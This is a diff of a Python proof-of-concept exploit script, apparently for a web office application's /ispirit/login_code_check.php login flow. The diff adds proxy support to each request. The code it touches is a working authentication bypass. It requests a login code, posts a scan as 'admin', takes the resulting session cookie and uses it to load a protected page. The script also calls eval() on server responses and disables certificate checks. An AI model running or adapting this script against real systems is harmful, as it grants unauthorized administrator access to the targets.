@@ -2,12 +2,10 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
 import re
 from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -25,7 +23,7 @@ def poc(target):
     login_code_headers = {
         "User-Agent" : ua
     }
-    login_code_res = requests.get(login_code_url,headers=login_code_headers, verify=False,timeout=5)
+    login_code_res = requests.get(login_code_url,headers=login_code_headers, verify=False,timeout=5,proxies=proxies)
     login_code_res = eval(login_code_res.text)
     try:
         codeuid = login_code_res['codeuid']
@@ -45,13 +43,13 @@ def poc(target):
             "username" : "admin"
         }
         # 第三步
-        login_code_scan_res = requests.post(login_code_scan_url,data=login_code_scan_data,headers=login_code_scan_headers, verify=False,timeout=5)
+        login_code_scan_res = requests.post(login_code_scan_url,data=login_code_scan_data,headers=login_code_scan_headers, verify=False,timeout=5,proxies=proxies)
         if "1" in login_code_scan_res.text:
             login_code_check_url = target+"/ispirit/login_code_check.php?codeuid="+codeuid
             login_code_check_headers = {
                 "User-Agent" : ua
             }
-            login_code_check_res = requests.get(login_code_check_url,headers=login_code_check_headers, verify=False,timeout=5)
+            login_code_check_res = requests.get(login_code_check_url,headers=login_code_check_headers, verify=False,timeout=5,proxies=proxies)
             if "confirm" in login_code_check_res.text:
                 login_cookie = login_code_check_res.headers['Set-Cookie']
                 # 第四步
@@ -60,7 +58,7 @@ def poc(target):
                     "User-Agent": ua,
                     "Cookie" : login_cookie
                 }
-                target_res = requests.get(target_url,headers=headers,verify=False,timeout=5)
+                target_res = requests.get(target_url,headers=headers,verify=False,timeout=5,proxies=proxies)
                 try:
                     title = re.findall('<title>(.*)</title>', str(target_res.text))[0]
                 except:
